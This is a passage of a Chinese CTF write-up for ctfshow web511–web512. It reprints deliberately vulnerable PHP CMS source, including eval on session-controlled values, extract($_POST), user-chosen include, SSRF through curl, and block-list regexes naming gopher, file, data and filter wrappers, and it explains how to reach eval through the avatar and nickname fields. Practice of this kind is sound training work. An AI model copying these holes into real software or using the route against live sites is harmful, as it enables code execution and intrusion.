class="title function_ invoke__">update_one</span>(<span class="variable">$sql</span>))&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>][<span class="string">&#x27;nickname&#x27;</span>]=<span class="variable">$nickname</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>][<span class="string">&#x27;avatar&#x27;</span>]=<span class="variable">$avatar</span>;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;管理员信息修改成功&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;管理员信息修改失败&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;请登录后使用此功能&#x27;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>api&#x2F;admin_file_view.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-24 00:53:45</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-25 15:46:06</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$user</span>= <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;查询失败&quot;</span>,</span><br><span class="line"><span class="string">&quot;count&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&quot;data&quot;</span>=&gt;<span class="keyword">array</span>()</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/php|sml|phar|\:|data|file|sess/i&#x27;</span>, <span class="variable">$f</span>))&#123;</span><br><span class="line">                <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;请不要使用此功能&#x27;</span>;</span><br><span class="line">                <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$debug</span>==<span class="number">1</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^user/&#x27;</span>, <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$f</span>)))&#123;</span><br><span class="line">                <span class="keyword">include</span>(<span class="variable">$f</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$ret</span>[<span class="string">&#x27;data&#x27;</span>]=<span class="keyword">array</span>(<span class="string">&#x27;contents&#x27;</span>=&gt;<span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../&#x27;</span>.<span class="variable">$name</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查看成功&#x27;</span>;</span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;请登录后使用此功能&#x27;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>render&#x2F;render_class.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 17:52:18</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-25 17:19:10</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;file_class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;cache_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">templateUtil</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$arg</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line"><span class="variable">$templateContent</span>=file<span class="title class_">Util</span>::<span class="title function_ invoke__">read</span>(<span class="string">&#x27;templates/&#x27;</span>.<span class="variable">$template</span>.<span class="string">&#x27;.sml&#x27;</span>);</span><br><span class="line"><span class="variable">$cache</span>=template<span class="title class_">Util</span>::<span class="title function_ invoke__">shade</span>(<span class="variable">$templateContent</span>,<span class="variable">$arg</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cache</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span>  <span class="function"><span class="keyword">function</span> <span class="title">shade</span>(<span class="params"><span class="variable">$templateContent</span>,<span class="variable">$arg</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line"><span class="variable">$templateContent</span>=template<span class="title class_">Util</span>::<span class="title function_ invoke__">checkImage</span>(<span class="variable">$templateContent</span>,<span class="variable">$arg</span>);</span><br><span class="line"><span class="variable">$templateContent</span>=template<span class="title class_">Util</span>::<span class="title function_ invoke__">checkConfig</span>(<span class="variable">$templateContent</span>);</span><br><span class="line"><span class="variable">$templateContent</span>=template<span class="title class_">Util</span>::<span class="title function_ invoke__">checkVar</span>(<span class="variable">$templateContent</span>,<span class="variable">$arg</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$arg</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line"><span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="variable">$value</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$templateContent</span>,<span class="variable">$arg</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$arg</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/gopher|file/i&#x27;</span>, <span class="variable">$value</span>))&#123;</span><br><span class="line"><span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;img:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$templateContent</span>, <span class="string">&#x27;&#123;&#123;img:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>))&#123;</span><br><span class="line"><span class="variable">$encode</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$value</span>)))&#123;</span><br><span class="line"><span class="variable">$encode</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$value</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$value</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="variable">$ret</span>=<span class="title function_ invoke__">chunk_split</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$result</span>));</span><br><span class="line"><span class="variable">$encode</span> = <span class="string">&#x27;data:image/jpg/png/gif;base64,&#x27;</span> . <span class="variable">$ret</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$value</span>), <span class="variable">$encode</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;img:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="variable">$encode</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkConfig</span>(<span class="params"><span class="variable">$templateContent</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$config</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../config/settings&#x27;</span>));</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$config</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$templateContent</span>, <span class="string">&#x27;&#123;&#123;config:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>))&#123;</span><br><span class="line"><span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;config:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="variable">$value</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVar</span>(<span class="params"><span class="variable">$templateContent</span>,<span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$arg</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$templateContent</span>, <span class="string">&#x27;&#123;&#123;var:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>))&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;$v=&#x27;</span>.<span class="variable">$value</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line"><span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;var:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="variable">$v</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这次得分析别的文件了在render&#x2F;render_class.php下面找到一个eval(),我们看看参数可不可控</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414135942222.png" alt="image-20220414135942222"></p><p>shade调用了checkvar()</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414140114969.png" alt="image-20220414140114969"></p><p>render调用了shade(),先读取了这个模板文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414140311853.png" alt="image-20220414140311853"></p><p>这个render总共有六处调用其中有两处传了arg参数,这里当然只有传参的才能利用,其他的就不看了</p><p>要想利用,只能去更改$user这个数组里面的值,那么我们去搜索哪里可以更改$_SESSION[‘user’]的值</p><p>发现在admin_deit.php存在</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414141131861.png" alt="image-20220414141131861"></p><p>这里的avatar仅仅过滤了几个字符简单可以绕过</p><p>先改一下</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414141636372.png" alt="image-20220414141636372"></p><p>接着index访问这个</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414141707910.png" alt="image-20220414141707910"></p><p>接着读取文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414141804254.png" alt="image-20220414141804254"></p><p>到这里我们还需要一个可以存在这里的<code>&#123;&#123;var:'.$key.'&#125;&#125;</code>也就是<code>&#123;&#123;var:'.$key.'&#125;&#125;</code>,我们之间上传一个就好了啊<code>&#123;&#123;var:nickname&#125;&#125;</code></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414141747100.png" alt="image-20220414141747100"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414145931393.png" alt="image-20220414145931393"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414150059799.png" alt="image-20220414150059799"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414145937985.png" alt="image-20220414145937985"></p><p>这里要注意stripos()函数,如果在第一位的话就执行不了了</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414145955200.png" alt="image-20220414145955200"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414190915815.png"></p><h1 id="web512"><a href="#web512" class="headerlink" title="web512"></a>web512</h1><p>render&#x2F;render_class.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 17:52:18</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-25 21:15:03</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;file_class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;cache_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">templateUtil</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$arg</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line"><span class="variable">$templateContent</span>=file<span class="title class_">Util</span>::<span class="title function_ invoke__">read</span>(<span class="string">&#x27;templates/&#x27;</span>.<span class="variable">$template</span>.<span class="string">&#x27;.sml&#x27;</span>);</span><br><span class="line"><span class="variable">$cache</span>=template<span class="title class_">Util</span>::<span class="title function_ invoke__">shade</span>(<span class="variable">$templateContent</span>,<span class="variable">$arg</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cache</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span>  <span class="function"><span class="keyword">function</span> <span class="title">shade</span>(<span class="params"><span class="variable">$templateContent</span>,<span class="variable">$arg</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line"><span class="variable">$templateContent</span>=template<span class="title class_">Util</span>::<span class="title function_ invoke__">checkImage</span>(<span class="variable">$templateContent</span>,<span class="variable">$arg</span>);</span><br><span class="line"><span class="variable">$templateContent</span>=template<span class="title class_">Util</span>::<span class="title function_ invoke__">checkConfig</span>(<span class="variable">$templateContent</span>);</span><br><span class="line"><span class="variable">$templateContent</span>=template<span class="title class_">Util</span>::<span class="title function_ invoke__">checkVar</span>(<span class="variable">$templateContent</span>,<span class="variable">$arg</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$arg</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line"><span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="variable">$value</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$templateContent</span>,<span class="variable">$arg</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$arg</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/gopher|file/i&#x27;</span>, <span class="variable">$value</span>))&#123;</span><br><span class="line"><span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;img:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$templateContent</span>, <span class="string">&#x27;&#123;&#123;img:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>))&#123;</span><br><span class="line"><span class="variable">$encode</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$value</span>)))&#123;</span><br><span class="line"><span class="variable">$encode</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$value</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$value</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="variable">$ret</span>=<span class="title function_ invoke__">chunk_split</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$result</span>));</span><br><span class="line"><span class="variable">$encode</span> = <span class="string">&#x27;data:image/jpg/png/gif;base64,&#x27;</span> . <span class="variable">$ret</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$value</span>), <span class="variable">$encode</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;img:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="variable">$encode</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkConfig</span>(<span class="params"><span class="variable">$templateContent</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$config</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../config/settings&#x27;</span>));</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$config</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$templateContent</span>, <span class="string">&#x27;&#123;&#123;config:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>))&#123;</span><br><span class="line"><span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;config:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="variable">$value</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVar</span>(<span class="params"><span class="variable">$templateContent</span>,<span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$db</span>=<span class="keyword">new</span> <span class="title class_">db</span>();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$arg</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$templateContent</span>, <span class="string">&#x27;&#123;&#123;var:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>))&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\(|\[|\`|\&#x27;|\&quot;|\+|nginx|\)|\]|include|data|text|filter|input|file|require|GET|POST|COOKIE|SESSION|file/i&#x27;</span>, <span class="variable">$value</span>))&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;$v=&#x27;</span>.<span class="variable">$value</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line"><span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;var:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="variable">$v</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里要进行拼接</p><p>db_class.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 20:43:40</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-15 05:02:27</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">db</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$log</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$port</span>=<span class="string">&#x27;3306&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$addr</span>=<span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$database</span>=<span class="string">&#x27;ctfshow&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;log=<span class="keyword">new</span> <span class="title class_">dbLog</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db=<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getConnection</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getConnection</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">mysqli</span>(<span class="variable language_">$this</span>-&gt;addr,<span class="variable language_">$this</span>-&gt;username,<span class="variable language_">$this</span>-&gt;password,<span class="variable language_">$this</span>-&gt;database);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span 